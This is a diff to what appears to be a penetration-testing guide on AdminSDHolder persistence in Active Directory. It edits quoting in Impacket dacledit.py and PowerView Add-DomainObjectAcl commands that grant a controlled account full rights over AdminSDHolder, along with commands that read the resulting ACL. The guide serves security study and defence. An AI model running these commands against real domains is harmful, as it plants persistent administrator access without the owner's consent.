@@ -52,13 +52,13 @@ From UNIX-like systems, this can be done with [Impacket](https://github.com/Secu
 
 
 ```bash
-dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlled_object' -target-dn "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL" "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
 AdminSdHolder's DACL can then be inspected with the same utility.
 
 ```bash
-dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' "$DOMAIN"/"$USER":"$PASSWORD"
+dacledit.py -action 'read' -target-dn "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL" "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
 
@@ -67,7 +67,7 @@ dacledit.py -action 'read' -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=L
 This can be done in PowerShell with `Add-DomainObjectAcl` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module.
 
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -PrincipalIdentity spotless -Verbose -Rights All
+Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity "$USER" -Verbose -Rights All
 ```
 
 AdminSdHolder's DACL can then be inspected with `Get-DomainObjectAcl`.
